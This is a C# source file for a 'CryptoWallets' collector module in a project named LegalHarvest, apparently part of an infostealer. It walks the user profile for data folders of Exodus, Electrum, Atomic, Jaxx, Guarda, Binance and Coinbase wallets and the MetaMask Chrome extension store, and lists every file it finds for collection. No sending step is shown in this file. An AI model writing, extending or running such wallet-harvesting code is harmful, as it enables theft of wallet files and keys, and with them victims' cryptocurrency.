using System;
using System.Collections.Generic;
using System.IO;

namespace LegalHarvest.Modules
{
    public class CryptoWalletsModule : ICollectorModule
    {
        public string ModuleName => "CryptoWallets";
        public bool CanExecute() => true;

        private readonly Dictionary<string, string> walletPaths = new Dictionary<string, string>
        {
            { "Exodus", @"AppData\Roaming\Exodus" },
            { "Electrum", @"AppData\Roaming\Electrum\wallets" },
            { "Atomic", @"AppData\Roaming\atomic" },
            { "Jaxx", @"AppData\Roaming\Jaxx" },
            { "Guarda", @"AppData\Roaming\Guarda" },
            { "Binance", @"AppData\Roaming\Binance" },
            { "Coinbase", @"AppData\Roaming\Coinbase" }
        };

        public List<CollectedItem> Collect()
        {
            var items = new List<CollectedItem>();
            string userProfile = Environment.GetEnvironmentVariable("USERPROFILE");

            foreach (var wallet in walletPaths)
            {
                string fullPath = wallet.Value.Replace("AppData", Path.Combine(userProfile, "AppData"));
                if (Directory.Exists(fullPath))
                    foreach (string file in Directory.GetFiles(fullPath, "*", SearchOption.AllDirectories))
                        items.Add(new CollectedItem { Category = $"CryptoWallet-{wallet.Key}", Name = Path.GetFileName(file), Value = file, Timestamp = DateTime.Now });
            }

            // MetaMask
            string mmPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn");
            if (Directory.Exists(mmPath))
                foreach (string file in Directory.GetFiles(mmPath, "*", SearchOption.AllDirectories))
                    items.Add(new CollectedItem { Category = "CryptoWallet-MetaMask", Name = file, Value = file, Timestamp = DateTime.Now });

            return items;
        }
    }
}
